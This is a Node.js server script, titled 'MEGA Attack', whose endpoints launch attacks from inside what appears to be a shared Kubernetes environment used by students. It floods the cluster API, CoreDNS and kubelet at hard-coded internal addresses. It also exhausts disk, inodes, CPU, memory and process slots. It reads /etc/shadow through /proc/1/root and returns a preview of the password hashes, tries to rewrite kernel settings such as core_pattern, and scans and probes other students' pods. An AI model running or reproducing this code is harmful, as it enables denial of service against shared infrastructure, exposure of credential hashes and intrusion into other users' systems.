const http = require("http");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const { spawn, fork, execSync } = require("child_process");
const net = require("net");
const dgram = require("dgram");

let results = {};

// 1. DISK EXHAUSTION - Fill disk with random data
async function diskExhaust() {
  results.diskExhaust = { written: 0, files: [] };
  
  const chunk = crypto.randomBytes(10 * 1024 * 1024); // 10MB chunks
  
  try {
    for (let i = 0; i < 100; i++) { // 1GB total
      const path = `/tmp/junk_${i}_${Date.now()}`;
      fs.writeFileSync(path, chunk);
      results.diskExhaust.written += chunk.length;
      results.diskExhaust.files.push(path);
      
      // Check disk usage
      try {
        const stat = fs.statfsSync("/tmp");
        const freeGB = (stat.bfree * stat.bsize) / (1024**3);
        if (freeGB < 0.5) {
          results.diskExhaust.stoppedAt = "Low disk";
          break;
        }
      } catch(e) {}
    }
  } catch(e) {
    results.diskExhaust.error = e.message;
  }
  
  results.diskExhaust.totalMB = (results.diskExhaust.written / (1024*1024)).toFixed(2);
  
  // Cleanup
  for (const f of results.diskExhaust.files) {
    try { fs.unlinkSync(f); } catch(e) {}
  }
}

// 2. CPU EXHAUSTION - Spin all cores
async function cpuExhaust() {
  results.cpuExhaust = { workers: os.cpus().length };
  
  const start = Date.now();
  const workers = [];
  
  // Spin up workers for each CPU
  for (let i = 0; i < os.cpus().length; i++) {
    const worker = () => {
      const end = Date.now() + 5000; // 5 seconds
      while (Date.now() < end) {
        // CPU burn
        crypto.createHash("sha256").update(crypto.randomBytes(1024)).digest();
      }
    };
    workers.push(worker);
  }
  
  // Run all workers
  await Promise.all(workers.map(w => new Promise(r => { w(); r(); })));
  
  results.cpuExhaust.duration = Date.now() - start;
}

// 3. FORK BOMB (controlled)
async function forkBomb() {
  results.forkBomb = { spawned: 0 };
  
  const children = [];
  
  try {
    for (let i = 0; i < 100; i++) {
      const child = spawn("sleep", ["10"], { 
        detached: false,
        stdio: "ignore"
      });
      children.push(child);
      results.forkBomb.spawned++;
    }
  } catch(e) {
    results.forkBomb.error = e.message;
    results.forkBomb.maxReached = children.length;
  }
  
  // Cleanup after 2 seconds
  setTimeout(() => {
    children.forEach(c => { try { c.kill(); } catch(e) {} });
  }, 2000);
}

// 4. INODE EXHAUSTION - Create many small files
async function inodeExhaust() {
  results.inodeExhaust = { created: 0 };
  
  const dir = `/tmp/inode_attack_${Date.now()}`;
  try { fs.mkdirSync(dir); } catch(e) {}
  
  try {
    for (let i = 0; i < 100000; i++) {
      fs.writeFileSync(`${dir}/f${i}`, "x");
      results.inodeExhaust.created++;
    }
  } catch(e) {
    results.inodeExhaust.error = e.message;
    results.inodeExhaust.maxReached = results.inodeExhaust.created;
  }
  
  // Cleanup
  try { fs.rmSync(dir, { recursive: true, force: true }); } catch(e) {}
}

// 5. NETWORK FLOOD - Flood internal services
async function networkFlood() {
  results.networkFlood = { connections: 0, bytes: 0 };
  
  const targets = [
    { host: "10.100.0.1", port: 443 },   // K8s API
    { host: "10.100.0.10", port: 53 },   // CoreDNS
    { host: "192.168.66.176", port: 10250 } // Kubelet
  ];
  
  const payload = crypto.randomBytes(65536);
  const sockets = [];
  
  for (const target of targets) {
    for (let i = 0; i < 100; i++) {
      try {
        const socket = new net.Socket();
        socket.setTimeout(5000);
        
        await new Promise(r => {
          socket.on("connect", () => {
            sockets.push(socket);
            results.networkFlood.connections++;
            
            // Flood with data
            for (let j = 0; j < 10; j++) {
              try {
                socket.write(payload);
                results.networkFlood.bytes += payload.length;
              } catch(e) {}
            }
            r();
          });
          socket.on("error", r);
          socket.on("timeout", r);
          socket.connect(target.port, target.host);
        });
      } catch(e) {}
    }
  }
  
  results.networkFlood.totalMB = (results.networkFlood.bytes / (1024*1024)).toFixed(2);
  
  // Cleanup
  sockets.forEach(s => { try { s.destroy(); } catch(e) {} });
}

// 6. UDP FLOOD
async function udpFlood() {
  results.udpFlood = { packets: 0 };
  
  const client = dgram.createSocket("udp4");
  const payload = crypto.randomBytes(65000);
  
  try {
    for (let i = 0; i < 5000; i++) {
      client.send(payload, 53, "10.100.0.10"); // CoreDNS
      results.udpFlood.packets++;
    }
  } catch(e) {
    results.udpFlood.error = e.message;
  }
  
  client.close();
}

// 7. Memory bomb (controlled)
async function memoryBomb() {
  results.memoryBomb = { allocated: 0 };
  const chunks = [];
  
  try {
    while (chunks.length < 40) { // ~2GB
      const chunk = Buffer.alloc(50 * 1024 * 1024); // 50MB
      chunk.fill(crypto.randomBytes(1)[0]);
      chunks.push(chunk);
      results.memoryBomb.allocated = chunks.length * 50;
      
      if (os.freemem() < 100 * 1024 * 1024) {
        results.memoryBomb.stoppedAt = "Low memory";
        break;
      }
    }
  } catch(e) {
    results.memoryBomb.error = e.message;
  }
  
  results.memoryBomb.totalMB = results.memoryBomb.allocated;
  
  // Let GC clean up
  chunks.length = 0;
}

// 8. Read /etc/shadow via /proc/1/root
async function readShadow() {
  results.shadowFile = {};
  
  try {
    const content = fs.readFileSync("/proc/1/root/etc/shadow", "utf8");
    results.shadowFile.readable = true;
    results.shadowFile.lines = content.split("\n").filter(l => l).length;
    results.shadowFile.preview = content.substring(0, 500);
  } catch(e) {
    results.shadowFile.readable = false;
    results.shadowFile.error = e.code;
  }
}

// 9. Try to write to /proc/sys for kernel params
async function procSysAttack() {
  results.procSysAttack = {};
  
  const targets = [
    "/proc/sys/kernel/randomize_va_space",
    "/proc/sys/kernel/core_pattern",
    "/proc/sys/net/ipv4/ip_forward"
  ];
  
  for (const target of targets) {
    try {
      const current = fs.readFileSync(target, "utf8").trim();
      results.procSysAttack[target] = { readable: true, value: current };
      
      try {
        fs.writeFileSync(target, "1");
        results.procSysAttack[target].writable = true;
      } catch(e) {
        results.procSysAttack[target].writable = false;
      }
    } catch(e) {
      results.procSysAttack[target] = { error: e.code };
    }
  }
}

// 10. Scan and attack other student pods aggressively
async function attackPods() {
  results.podAttack = { found: [], attacked: [] };
  
  const myIP = Object.values(os.networkInterfaces())
    .flat()
    .find(i => i.family === "IPv4" && !i.internal)?.address;
  
  if (!myIP) return;
  
  const [b1, b2] = myIP.split(".");
  
  // Aggressive scan
  for (let s = 0; s <= 255; s += 4) {
    for (let h = 1; h <= 254; h += 4) {
      const ip = `${b1}.${b2}.${s}.${h}`;
      if (ip === myIP) continue;
      
      const socket = new net.Socket();
      socket.setTimeout(30);
      
      await new Promise(r => {
        socket.on("connect", () => {
          results.podAttack.found.push(ip);
          socket.destroy();
          
          // Try to attack
          http.get(`http://${ip}:3000/`, { timeout: 500 }, res => {
            let body = "";
            res.on("data", c => body += c);
            res.on("end", () => {
              results.podAttack.attacked.push({ ip, status: res.statusCode, body: body.substring(0, 100) });
            });
          }).on("error", () => {});
          
          r();
        });
        socket.on("error", r);
        socket.on("timeout", () => { socket.destroy(); r(); });
        socket.connect(3000, ip);
      });
    }
  }
}

const server = http.createServer(async (req, res) => {
  results = { timestamp: new Date().toISOString(), hostname: os.hostname() };
  
  try {
    if (req.url === "/mega") {
      await diskExhaust();
      await cpuExhaust();
      await forkBomb();
      await networkFlood();
      await udpFlood();
      await readShadow();
      await procSysAttack();
    } else if (req.url === "/disk") {
      await diskExhaust();
    } else if (req.url === "/cpu") {
      await cpuExhaust();
    } else if (req.url === "/fork") {
      await forkBomb();
    } else if (req.url === "/inode") {
      await inodeExhaust();
    } else if (req.url === "/network") {
      await networkFlood();
    } else if (req.url === "/memory") {
      await memoryBomb();
    } else if (req.url === "/shadow") {
      await readShadow();
    } else if (req.url === "/procsys") {
      await procSysAttack();
    } else if (req.url === "/pods") {
      await attackPods();
    }
    
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify(results, null, 2));
  } catch(e) {
    res.writeHead(500);
    res.end(JSON.stringify({ error: e.message, stack: e.stack }));
  }
});

server.listen(process.env.PORT || 3000);
console.log("MEGA Attack on port " + (process.env.PORT || 3000));
